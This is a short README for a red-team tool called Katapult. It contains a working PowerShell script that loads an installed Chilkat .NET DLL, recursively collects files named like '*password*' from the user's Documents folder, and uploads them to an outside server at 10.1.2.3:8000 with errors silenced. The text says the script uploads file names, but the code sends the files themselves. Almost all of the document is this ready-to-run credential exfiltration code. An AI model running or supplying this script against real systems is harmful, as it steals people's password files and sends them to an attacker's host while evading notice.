# Katapult

Example of exploiting the Chilkat .NET assembly for Red Team exercises using Powershell.

This example searches the user's MyDocuments folder and uploads file names matching *password* to an external web server.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $up = New-Object Chilkat.Upload
   $docs = [environment]::getfolderpath("mydocuments")
   $up.Hostname = "10.1.2.3"
   $up.Port = 8000
   $up.Path = "/upload"
   $up.Expect100Continue = $false
   Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName | ForEach-Object {
      $up.AddFileReference("files", $_)
   }
   $null = $up.BlockingUpload()
}
```
